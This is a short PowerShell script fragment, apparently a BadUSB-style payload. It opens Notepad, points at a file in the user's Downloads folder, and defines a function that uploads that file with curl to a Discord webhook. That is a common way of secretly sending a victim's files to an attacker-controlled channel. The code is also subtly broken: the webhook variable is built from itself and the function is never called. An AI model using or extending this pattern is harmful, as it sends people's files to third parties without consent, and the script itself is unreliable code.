Start-Process 'C:\windows\system32\notepad.exe'

$path = "$env:USERPROFILE\Downloads\test.txt\"

function Upload-Discord {
$wh = "https://discord.com/api/webhooks/$wh"
curl.exe -F "payload_json={\`"username\`": \`"Tester\`", \`"content\`": \`"New test\`"}" -F "file=@\`"$path`"" $wh
}
